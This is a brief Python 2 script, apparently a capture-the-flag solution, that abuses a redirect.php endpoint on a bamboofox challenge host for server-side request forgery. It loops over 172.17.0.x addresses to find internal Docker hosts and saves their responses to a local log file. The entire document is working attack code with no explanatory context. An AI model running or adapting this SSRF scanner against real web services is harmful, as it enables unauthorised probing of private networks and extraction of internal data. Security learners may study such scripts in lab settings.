import requests

output = ""
for i in range(1,501):
	try:
		r = requests.post("http://bamboofox.cs.nctu.edu.tw:53323/redirect.php",data={'url':'172.17.0.' + str(i)},timeout=0.5)
		if "Warning" not in r.text:
			print "[+] !!!! " + '172.17.0.' + str(i)
			output += "==============172.17.0." + str(i) + "====================="
			output += r.text
			output += "============================================================\r\n"
		else:
			print "[-] Fail : " + '172.17.0.' + str(i)
	except:
		print "[-]"

with open("C:/Users/admin/Desktop/out.log", "wb") as f:
	f.write(output.encode('ascii', 'ignore').decode('ascii'))
	f.close() 